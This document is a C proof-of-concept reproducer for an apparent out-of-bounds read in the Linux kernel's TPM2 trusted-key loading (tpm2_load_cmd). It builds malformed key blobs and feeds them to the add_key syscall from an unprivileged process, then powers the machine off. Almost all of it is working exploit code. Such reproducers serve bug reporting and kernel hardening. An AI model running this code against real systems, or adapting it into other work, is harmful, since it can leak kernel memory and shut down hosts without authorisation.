// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/reboot.h>
#include <grp.h>

#define KEY_SPEC_PROCESS_KEYRING (-2)

static long add_key_(const char *type, const char *desc,
		     const void *payload, size_t plen, int ringid)
{
	return syscall(__NR_add_key, type, desc, payload, plen, ringid);
}

static int enc_len(unsigned char *out, unsigned int len)
{
	if (len < 0x80) {
		out[0] = (unsigned char)len;
		return 1;
	}
	if (len <= 0xff) {
		out[0] = 0x81;
		out[1] = (unsigned char)len;
		return 2;
	}
	out[0] = 0x82;
	out[1] = (unsigned char)(len >> 8);
	out[2] = (unsigned char)(len & 0xff);
	return 3;
}

static int build_tpmkey_der(unsigned char *out, int out_sz,
			    int parent_content_len,
			    unsigned short private_len,
			    unsigned short pub_val)
{
	static const unsigned char oid[6] = { 0x67, 0x81, 0x05, 0x0a, 0x01, 0x05 };
	unsigned char inner[4096];
	int n = 0, k = 0;

	if (parent_content_len < 4 || parent_content_len > 3000)
		return -1;

	inner[n++] = 0x06;
	inner[n++] = 0x06;
	memcpy(inner + n, oid, 6);
	n += 6;

	inner[n++] = 0x02;
	n += enc_len(inner + n, parent_content_len);
	memset(inner + n, 0, parent_content_len - 4);
	n += parent_content_len - 4;
	inner[n++] = 0x81;
	inner[n++] = 0x00;
	inner[n++] = 0x00;
	inner[n++] = 0x01;

	inner[n++] = 0x04;
	inner[n++] = 0x02;
	inner[n++] = (unsigned char)(pub_val >> 8);
	inner[n++] = (unsigned char)(pub_val & 0xff);

	inner[n++] = 0x04;
	inner[n++] = 0x02;
	inner[n++] = (unsigned char)(private_len >> 8);
	inner[n++] = (unsigned char)(private_len & 0xff);

	out[k++] = 0x30;
	k += enc_len(out + k, n);
	if (k + n > out_sz)
		return -1;
	memcpy(out + k, inner, n);
	k += n;
	return k;
}

static void hexify(const unsigned char *in, int len, char *out)
{
	static const char *h = "0123456789abcdef";
	int i;
	for (i = 0; i < len; i++) {
		out[2 * i]     = h[in[i] >> 4];
		out[2 * i + 1] = h[in[i] & 0xf];
	}
	out[2 * len] = '\0';
}

static void show_tpm(void)
{
	static const char *paths[] = {
		"/sys/class/tpm/tpm0/tpm_version_major",
		"/sys/class/tpm/tpm0/device/description",
		NULL
	};
	char buf[128];
	int i, fd, n;

	for (i = 0; paths[i]; i++) {
		fd = open(paths[i], O_RDONLY);
		if (fd < 0) {
			printf("[!] %s: %s\n", paths[i], strerror(errno));
			continue;
		}
		n = read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (n < 0)
			n = 0;
		buf[n] = '\0';
		while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == ' '))
			buf[--n] = '\0';
		printf("[+] %s = %s\n", paths[i], buf);
	}
}

static int build_tpmkey_der2(unsigned char *out, int out_sz,
			     int parent_content_len,
			     const unsigned char *pub, int pub_len,
			     const unsigned char *priv, int priv_len)
{
	static const unsigned char oid[6] = { 0x67, 0x81, 0x05, 0x0a, 0x01, 0x05 };
	unsigned char inner[4096];
	int n = 0, k = 0;

	if (parent_content_len < 4 || parent_content_len > 3000)
		return -1;

	inner[n++] = 0x06;
	inner[n++] = 0x06;
	memcpy(inner + n, oid, 6);
	n += 6;

	inner[n++] = 0x02;
	n += enc_len(inner + n, parent_content_len);
	memset(inner + n, 0, parent_content_len - 4);
	n += parent_content_len - 4;
	inner[n++] = 0x81;
	inner[n++] = 0x00;
	inner[n++] = 0x00;
	inner[n++] = 0x01;

	inner[n++] = 0x04;
	n += enc_len(inner + n, pub_len);
	memcpy(inner + n, pub, pub_len);
	n += pub_len;

	inner[n++] = 0x04;
	n += enc_len(inner + n, priv_len);
	memcpy(inner + n, priv, priv_len);
	n += priv_len;

	out[k++] = 0x30;
	k += enc_len(out + k, n);
	if (k + n > out_sz)
		return -1;
	memcpy(out + k, inner, n);
	k += n;
	return k;
}

static void attack_attrs(void)
{
	static const unsigned char pub[2]  = { 0x00, 0x00 };
	static const unsigned char priv[8] = { 0x00, 0x06, 0, 0, 0, 0, 0, 0 };
	unsigned char der[1200];
	char hex[2 * 1200 + 1];
	char datablob[4096];
	int der_len;
	long rc;

	der_len = build_tpmkey_der2(der, sizeof(der), 24,
				    pub, sizeof(pub), priv, sizeof(priv));
	if (der_len < 0) {
		printf("[!] variant2: DER build failed\n");
		return;
	}

	hexify(der, der_len, hex);
	snprintf(datablob, sizeof(datablob), "load %s", hex);

	printf("[*] variant2: priv_len=8 pub_len=2 blob_len=%d alloc=14  "
	       "attrs OOB read at offset 14\n", der_len);
	fflush(stdout);

	errno = 0;
	rc = add_key_("trusted", "poc_key2", datablob,
		      strlen(datablob), KEY_SPEC_PROCESS_KEYRING);
	printf("    add_key -> %ld (%s)\n", rc,
	       rc < 0 ? strerror(errno) : "ok");
	fflush(stdout);
}

static void attack(void)
{

	static const unsigned short lens[] = {
		8, 10, 14, 22, 30, 46, 62, 94, 126, 190, 254, 382, 510, 766, 1000
	};
	unsigned char der[1200];
	char hex[2 * 1200 + 1];
	char datablob[4096];
	int i;

	printf("[*] uid=%d euid=%d gid=%d  (unprivileged)\n",
	       getuid(), geteuid(), getgid());

	for (i = 0; i < (int)(sizeof(lens) / sizeof(lens[0])); i++) {
		unsigned short pl = lens[i];
		int parent_len, der_len;
		long rc;

		parent_len = pl + 4 + 16;
		if (parent_len < 4)
			parent_len = 4;
		if (parent_len > 1100)
			parent_len = 1100;

		der_len = build_tpmkey_der(der, sizeof(der), parent_len, pl, 0);
		if (der_len < 0 || der_len > 1152) {
			printf("[!] private_len=%u: DER too big (%d)\n", pl, der_len);
			continue;
		}

		hexify(der, der_len, hex);
		snprintf(datablob, sizeof(datablob), "load %s", hex);

		printf("[*] try private_len=%-5u blob_len=%-5d alloc=8  "
		       "OOB read at offset %u\n",
		       pl, der_len, (unsigned)(2 + pl));
		fflush(stdout);

		errno = 0;
		rc = add_key_("trusted", "poc_key", datablob,
			      strlen(datablob), KEY_SPEC_PROCESS_KEYRING);
		printf("    add_key -> %ld (%s)\n", rc,
		       rc < 0 ? strerror(errno) : "ok");
		fflush(stdout);
	}
}

int main(void)
{
	pid_t pid;
	int st;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== TPM2 trusted-key tpm2_load_cmd() OOB read PoC ===\n");
	show_tpm();

	pid = fork();
	if (pid == 0) {

		setgroups(0, NULL);
		if (setgid(1000) || setuid(1000))
			printf("[!] setuid/setgid failed: %s\n", strerror(errno));
		attack();
		attack_attrs();
		_exit(0);
	}
	waitpid(pid, &st, 0);

	printf("=== done ===\n");
	fflush(stdout);
	sleep(2);
	sync();
	reboot(RB_POWER_OFF);
	return 0;
}
